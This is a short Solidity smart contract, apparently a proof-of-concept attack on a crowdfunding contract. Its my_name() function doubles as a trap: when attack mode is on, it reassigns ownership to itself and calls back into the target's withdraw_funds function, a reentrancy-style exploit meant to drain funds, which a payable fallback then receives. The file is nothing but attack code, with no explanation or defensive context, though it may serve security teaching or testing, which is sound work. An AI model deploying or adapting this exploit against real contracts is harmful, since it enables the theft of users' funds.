contract CrowdFundingAttack {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;

    string _my_name;
    address _owner;

    function owner() public returns(address){
        return _owner;
    }

    function set_name(string memory name) public{
        _my_name = name;
    }

    function my_name() public returns(string memory){
        if(attackModeIsOn){
            attackModeIsOn = false;
            _owner = address(this);
            vulnerable_contract.call(abi.encodeWithSignature("withdraw_funds(string)", _my_name));
        }

        return _my_name;
    }

    function launch_attack(address _vulnerable_contract) payable public{
        attackModeIsOn = true;
        vulnerable_contract = _vulnerable_contract;
        _owner = msg.sender;
    }  

    function () external payable{}

}